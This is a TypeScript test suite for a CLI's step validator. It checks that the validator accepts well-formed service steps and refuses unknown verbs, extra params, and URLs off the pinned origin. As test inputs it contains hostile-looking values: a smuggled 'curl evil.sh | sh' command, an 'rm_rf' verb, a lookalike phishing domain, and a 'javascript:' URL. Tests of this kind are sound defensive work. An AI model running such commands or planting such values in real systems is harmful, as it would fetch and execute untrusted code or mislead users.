/**
 * The trust boundary: what this CLI will and will not execute.
 *
 * Every case here is a step the service could send. The rule under test is the
 * same one throughout — unknown is a REFUSAL, never a skip and never a
 * best-effort guess — and each refusal carries a machine-readable code.
 */
import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { FLOW_CONTRACT_VERSION, FLOW_ERROR_CODES, FlowContractError, validateStep } from '../../src/flows/validate';

const FLOW_ID = 'flow-1';

function step(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    contract_version: FLOW_CONTRACT_VERSION,
    flow_id: FLOW_ID,
    flow_type: 'onboard',
    step_id: 'step-1',
    kind: 'local_action',
    resumed: false,
    verb: 'write_capy_dir',
    params: { branch: 'development' },
    ...overrides,
  };
}

function refusal(raw: unknown, flowId: string | undefined = FLOW_ID): FlowContractError {
  try {
    validateStep(raw, flowId);
  } catch (err) {
    if (err instanceof FlowContractError) return err;
    throw err;
  }
  throw new Error('expected a refusal');
}

describe('validateStep — what it accepts', () => {
  test('a well-formed local action', () => {
    const result = validateStep(step(), FLOW_ID);
    expect(result.kind).toBe('local_action');
    expect(result.verb).toBe('write_capy_dir');
  });

  test('a screen on the pinned Keep origin', () => {
    const result = validateStep(
      step({
        kind: 'screen',
        verb: undefined,
        screen: 'sandbox_session',
        url: 'https://keep.capy.sc/flow/sandbox-session?c=abc',
        params: { connection_id: 'abc', user_code: 'BCDF-GHJK' },
      }),
      FLOW_ID,
    );
    expect(result.screen).toBe('sandbox_session');
  });

  test('a confirm dialog and a blocked reason from the closed enums', () => {
    expect(
      validateStep(step({ kind: 'confirm', verb: undefined, dialog: 'onboard_plan', params: { plan_hash: 'h', target_dir: '/x' } }), FLOW_ID).dialog,
    ).toBe('onboard_plan');
    expect(validateStep(step({ kind: 'blocked', verb: undefined, reason: 'branch_conflict', params: {} }), FLOW_ID).reason).toBe(
      'branch_conflict',
    );
  });
});

describe('validateStep — what it refuses', () => {
  test('an unknown step kind', () => {
    expect(refusal(step({ kind: 'run_shell' })).code).toBe(FLOW_ERROR_CODES.UNKNOWN_KIND);
  });

  test('an unknown verb, even under a known kind', () => {
    expect(refusal(step({ verb: 'rm_rf' })).code).toBe(FLOW_ERROR_CODES.UNKNOWN_VERB);
  });

  test('an unknown screen, dialog or blocked reason', () => {
    expect(refusal(step({ kind: 'screen', verb: undefined, screen: 'phish', url: 'https://keep.capy.sc/x', params: {} })).code).toBe(
      FLOW_ERROR_CODES.UNKNOWN_SCREEN,
    );
    expect(refusal(step({ kind: 'confirm', verb: undefined, dialog: 'gimme', params: {} })).code).toBe(
      FLOW_ERROR_CODES.UNKNOWN_DIALOG,
    );
    expect(refusal(step({ kind: 'blocked', verb: undefined, reason: 'because', params: {} })).code).toBe(
      FLOW_ERROR_CODES.UNKNOWN_REASON,
    );
  });

  test('params the vendored schema does not describe', () => {
    const extra = refusal(step({ params: { branch: 'main', run: 'curl evil.sh | sh' } }));
    expect(extra.code).toBe(FLOW_ERROR_CODES.INVALID_PARAMS);
  });

  test('a param of the wrong type', () => {
    expect(refusal(step({ verb: 'encrypt_env', params: { branch: 'main', variable_count: 'lots' } })).code).toBe(
      FLOW_ERROR_CODES.INVALID_PARAMS,
    );
  });

  test('a required closed-enum param that is missing or out of range', () => {
    expect(refusal(step({ verb: 'write_keep_lock', params: {} })).code).toBe(FLOW_ERROR_CODES.INVALID_PARAMS);
    expect(refusal(step({ verb: 'write_keep_lock', params: { source: 'whatever' } })).code).toBe(
      FLOW_ERROR_CODES.INVALID_PARAMS,
    );
  });

  test('a URL on any origin but the pinned one — the phishing gate', () => {
    const phish = refusal(
      step({
        kind: 'screen',
        verb: undefined,
        screen: 'sandbox_session',
        url: 'https://keep.capy.sc.evil.example/flow/sandbox-session?c=abc',
        params: { connection_id: 'abc', user_code: 'BCDF-GHJK' },
      }),
    );
    expect(phish.code).toBe(FLOW_ERROR_CODES.FOREIGN_URL);
  });

  test('a URL that is not a URL at all', () => {
    expect(
      refusal(
        step({
          kind: 'screen',
          verb: undefined,
          screen: 'sandbox_session',
          url: 'javascript:alert(1)',
          params: { connection_id: 'abc', user_code: 'X' },
        }),
      ).code,
    ).toBe(FLOW_ERROR_CODES.FOREIGN_URL);
  });

  test('a step minted under another contract version', () => {
    expect(refusal(step({ contract_version: '99' })).code).toBe(FLOW_ERROR_CODES.UNSUPPORTED_VERSION);
  });

  test('a step for a different flow instance', () => {
    expect(refusal(step({ flow_id: 'someone-elses' })).code).toBe(FLOW_ERROR_CODES.WRONG_FLOW);
  });

  test('anything that is not a step-shaped object', () => {
    expect(refusal(null).code).toBe(FLOW_ERROR_CODES.MALFORMED_STEP);
    expect(refusal([]).code).toBe(FLOW_ERROR_CODES.MALFORMED_STEP);
    expect(refusal(step({ step_id: '' })).code).toBe(FLOW_ERROR_CODES.MALFORMED_STEP);
    expect(refusal(step({ resumed: 'yes' })).code).toBe(FLOW_ERROR_CODES.MALFORMED_STEP);
    expect(refusal(step({ params: 'nope' })).code).toBe(FLOW_ERROR_CODES.MALFORMED_STEP);
  });
});

describe('validateStep — the pinned origin is this binary\'s, not the service\'s', () => {
  const original = process.env.CAPY_KEEP_ORIGIN;
  beforeEach(() => {
    process.env.CAPY_KEEP_ORIGIN = 'http://keep.localhost:3002';
  });
  afterEach(() => {
    if (original === undefined) delete process.env.CAPY_KEEP_ORIGIN;
    else process.env.CAPY_KEEP_ORIGIN = original;
  });

  test('accepts the configured origin and refuses the production one under it', () => {
    const local = step({
      kind: 'screen',
      verb: undefined,
      screen: 'sandbox_session',
      url: 'http://keep.localhost:3002/flow/sandbox-session?c=abc',
      params: { connection_id: 'abc', user_code: 'X' },
    });
    expect(validateStep(local, FLOW_ID).kind).toBe('screen');

    const prod = step({
      kind: 'screen',
      verb: undefined,
      screen: 'sandbox_session',
      url: 'https://keep.capy.sc/flow/sandbox-session?c=abc',
      params: { connection_id: 'abc', user_code: 'X' },
    });
    expect(refusal(prod).code).toBe(FLOW_ERROR_CODES.FOREIGN_URL);
  });
});
